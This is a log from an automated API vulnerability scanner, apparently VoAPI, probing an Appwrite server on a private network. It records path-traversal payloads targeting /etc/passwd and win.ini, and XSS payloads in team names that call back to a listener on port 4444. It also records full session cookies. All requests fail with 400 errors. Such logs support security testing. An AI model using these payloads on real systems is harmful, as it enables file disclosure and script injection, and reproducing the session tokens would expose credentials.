+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'search': 'C:\\Windows\\win.ini', 'limit': 41, 'offset': 3, 'orderType': 'ASC'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/storage/files
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'search': '..\\..\\..\\..\\..\\..\\..\\..\\..\\C:\\Windows\\win.ini', 'limit': 6, 'offset': 36, 'orderType': 'ASC'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/storage/files
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'search': 'VoAPITestString14', 'limit': 19, 'offset': 7, 'orderType': '/etc/passwd'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/storage/files
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'search': 'VoAPITestString41', 'limit': 21, 'offset': 36, 'orderType': '../../../../../../../../../etc/passwd'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/storage/files
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'search': 'VoAPITestString11', 'limit': 36, 'offset': 21, 'orderType': 'C:\\Windows\\win.ini'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: get http://192.168.1.118/v1/storage/files
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {'search': 'VoAPITestString19', 'limit': 29, 'offset': 8, 'orderType': '..\\..\\..\\..\\..\\..\\..\\..\\..\\C:\\Windows\\win.ini'}
+request_data: {}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f39572f3eb0>, <VoAPITemplate.ApiTemplate object at 0x7f3956f73610>, <VoAPITemplate.ApiTemplate object at 0x7f3957457400>]
+/storage/files Post
+/storage/files/{fileId} Put
+/storage/files/{fileId}/preview Get
+candidate_api_seq_relations: ---------------
+producer_api: /storage/files/{fileId} Put
+producer_param: $id
+consumer_api: /storage/files/{fileId}/preview Get
+consumer_param: fileId
+------------
+producer_api: /storage/files Post
+producer_param: $id
+consumer_api: /storage/files/{fileId} Put
+consumer_param: fileId
+------------
+candidate_api_test_types: {'path_api': ['gravity', 'borderColor', 'background', 'output'], 'display_api': ['gravity', 'borderColor', 'background', 'output']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/storage/files
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'file': 'MultiPartValue'}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f395774f2b0>]
+/teams Post
+candidate_api_seq_relations: ---------------
+candidate_api_test_types: {'display_api': ['name']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/teams
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': "<img src='http://192.168.1.118:4444/xss/teamsVoAPIname'>", 'roles': ['VoAPITestString31']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/teams
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': "<img src='https://192.168.1.118:4445/xss/teamsVoAPIname'>", 'roles': ['VoAPITestString40']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/teams
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': "<script>window.location='http://192.168.1.118:4444/xss/teamsVoAPIname'</script>", 'roles': ['VoAPITestString1']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f395774f2b0>, <VoAPITemplate.ApiTemplate object at 0x7f39580cd6d0>]
+/teams Post
+/teams/{teamId} Put
+candidate_api_seq_relations: ---------------
+producer_api: /teams Post
+producer_param: $id
+consumer_api: /teams/{teamId} Put
+consumer_param: teamId
+------------
+producer_api: /teams Post
+producer_param: name
+consumer_api: /teams/{teamId} Put
+consumer_param: name
+------------
+candidate_api_test_types: {'display_api': ['name']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/teams
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': 'VoAPITestString33', 'roles': ['VoAPITestString4']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f395774f2b0>, <VoAPITemplate.ApiTemplate object at 0x7f39580cd6d0>, <VoAPITemplate.ApiTemplate object at 0x7f39575b2a60>, <VoAPITemplate.ApiTemplate object at 0x7f395708d8e0>]
+/teams Post
+/teams/{teamId} Put
+/teams/{teamId}/memberships Post
+/teams/{teamId}/memberships Get
+candidate_api_seq_relations: ---------------
+producer_api: /teams/{teamId}/memberships Post
+producer_param: teamId
+consumer_api: /teams/{teamId}/memberships Get
+consumer_param: teamId
+------------
+producer_api: /teams/{teamId} Put
+producer_param: $id
+consumer_api: /teams/{teamId}/memberships Post
+consumer_param: teamId
+------------
+producer_api: /teams/{teamId} Put
+producer_param: name
+consumer_api: /teams/{teamId}/memberships Post
+consumer_param: name
+------------
+producer_api: /teams Post
+producer_param: $id
+consumer_api: /teams/{teamId} Put
+consumer_param: teamId
+------------
+producer_api: /teams Post
+producer_param: name
+consumer_api: /teams/{teamId} Put
+consumer_param: name
+------------
+candidate_api_test_types: {'command_api': ['search', 'orderType']}
+----------------Send: -----------------------
+send request: post http://192.168.1.118/v1/teams
+api_header_dict: {'Content-Type': 'application/json', 'X-Appwrite-Project': '6535db029948e', 'X-Appwrite-Mode': 'admin', 'Cookie': '_ga=GA1.1.175492708.1680936283; _gid=GA1.1.333765248.1698028254; _ga_EXFX9C09LD=GS1.1.1698028255.1.0.1698028255.0.0.0; a_session_console_legacy=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; a_session_console=eyJpZCI6IjY0NzU2Yzk5MjExNzIiLCJzZWNyZXQiOiJiYzA0MjgxNjU5YTQ5MjNkZjAwOWY3ZTE4NTY4MWFjM2YwZDExOWJhYjVlZWU4NTI0MGI5ZWM2ODdiODQwMDNmOTJkMTc1MjExZTM0NGU4MjlmNjgxN2NiN2E0ZmFlNDA2MzAyZjMzZTY1ODNiNDgzOWZhNTkzMTdmMTc4MzUyZmExNTQyZGI5YjczNzBjNDRjYzgwYzIwOTVlNWY1ZTk0NGI1OWVlMDNhOWQ1YzA3ZWNmNTQyODZkM2U0ZjM2NWFjZDMxNzRkOTZlYzc2ZDFlNGU3MzcxNjYxNDRmZWFiZTY0ZmE1ZjQzNjkyZGMxZmFjMzM4YmRkYzgwZmQwMWE2In0%3D; _gat=1'}
+api_query_dict: {}
+request_data: {'name': 'VoAPITestString34', 'roles': ['VoAPITestString34']}
+response: {"message":"Missing or unknown project ID","code":400,"version":"0.9.3"}
+status_code: 400
+##############
+candidate_api_seq: [<VoAPITemplate.ApiTemplate object at 0x7f395774f2b0>, <VoAPITemplate.ApiTemplate object at 0x7f39580cd6d0>, <VoAPITemplate.ApiTemplate object at 0x7f39575b2a60>]
+/teams Post
+/teams/{teamId} Put
+/teams/{teamId}/memberships Post
+candidate_api_seq_relations: ---------------
+producer_api: /teams/{teamId} Put
+producer_param: $id
+consumer_api: /teams/{teamId}/memberships Post
+consumer_param: teamId
+------------
+producer_api: /teams/{teamId} Put
+producer_param: name
+consumer_api: /teams/{teamId}/memberships Post
+consumer_param: name
+------------
+producer_api: /teams Post
+producer_param: $id
+consumer_api: /teams/{teamId} Put
+consumer_param: teamId
+------------
+producer_api: /teams Post
+producer_param: name
+consumer_api: /teams/{teamId} Put
+consumer_param: name
+------------
+candidate_api_test_types: {'proxy_api': ['url'], 'command_api': ['email', 'name', 'url'], 'display_api': ['name']}
+----------------Send: -----------------------
